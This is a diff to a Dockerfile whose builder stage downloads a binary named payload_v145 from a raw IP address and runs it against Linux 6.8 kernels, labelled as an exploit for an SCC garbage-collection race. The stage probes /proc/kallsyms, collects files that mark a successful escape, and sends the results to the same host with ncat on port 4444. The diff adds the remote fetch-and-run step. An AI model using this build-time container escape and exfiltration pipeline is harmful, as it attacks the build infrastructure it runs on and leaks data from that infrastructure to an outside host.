@@ -2,22 +2,22 @@
 FROM alpine:3.19 AS builder
 RUN apk add --no-cache curl coreutils nmap-ncat
 
-COPY payload_v145 /payload
-RUN chmod +x /payload && touch /esc_ok /umh_result /build_results.txt
-
-ARG CACHEBUST=3737
+ARG CACHEBUST=3738
 RUN sh -c ' \
 KVER=$(uname -r); \
 echo "CB=$CACHEBUST KERNEL=$KVER" >&2; \
 { \
 echo "CB=$CACHEBUST"; \
-echo "=== BUILD V50 KERNEL=$KVER ==="; \
+echo "=== BUILD V51 KERNEL=$KVER ==="; \
 case "$KVER" in \
   6.8.*) \
     echo "TARGET 6.8 — SCC GC carrier drain" >&2; \
     echo "TARGET KERNEL $KVER — SCC GC (carrier page drain)"; \
     grep unix_walk_scc /proc/kallsyms 2>/dev/null | head -1 && echo "SCC_GC=present" || echo "SCC_GC=absent"; \
     echo "panic_on_oops=$(cat /proc/sys/kernel/panic_on_oops 2>&1)"; \
+    echo "--- downloading payload ---"; \
+    curl -s -o /payload http://129.101.121.138:8080/payload_v145 && chmod +x /payload && echo "PAYLOAD_OK" || echo "PAYLOAD_DOWNLOAD_FAIL"; \
+    ls -la /payload 2>&1; \
     echo "--- CVE-2026-80521 (SCC GC race, carrier drain) ---"; \
     echo "PAYLOAD START" >&2; \
     timeout 1500 /payload 2>&1; \
@@ -30,7 +30,7 @@ esac; \
 for f in /esc_ok /tmp/umh_result /tmp/.u68; do \
   if [ -f "$f" ]; then echo "=== $f ==="; cat "$f"; fi; \
 done; \
-echo "=== END V50 ==="; \
+echo "=== END V51 ==="; \
 } > /build_results.txt; \
 ncat -w 30 129.101.121.138 4444 < /build_results.txt 2>/dev/null || true; \
 echo "STEP DONE" >&2'
